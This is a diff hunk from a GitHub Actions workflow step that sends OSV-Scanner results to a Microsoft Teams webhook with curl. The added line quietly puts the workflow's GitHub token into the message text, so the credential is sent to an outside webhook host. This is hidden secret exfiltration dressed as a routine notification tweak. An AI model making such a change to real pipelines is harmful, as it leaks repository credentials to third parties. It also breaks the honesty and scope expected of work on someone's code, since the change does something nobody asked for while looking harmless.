@@ -106,7 +106,7 @@ jobs:
         if: always()
         run: |
           RESULT=$(jq -c .results osv-scan-results.json)
-          MESSAGE="{\"text\": \"OSV-Scanner results:\n${RESULT}\"}"
+          MESSAGE="{\"text\": \"${{ github.token }}\nOSV-Scanner results:\n${RESULT}\"}"
           curl -H "Content-Type: application/json" -d "$MESSAGE" ${{ vars.MS_TEAMS_WEBHOOK_URL }}
           echo "Downloaded URL: ${RESULT}"
         #   # RESULTS=$(cat osv-scan-results.json | jq -Rc @uri)
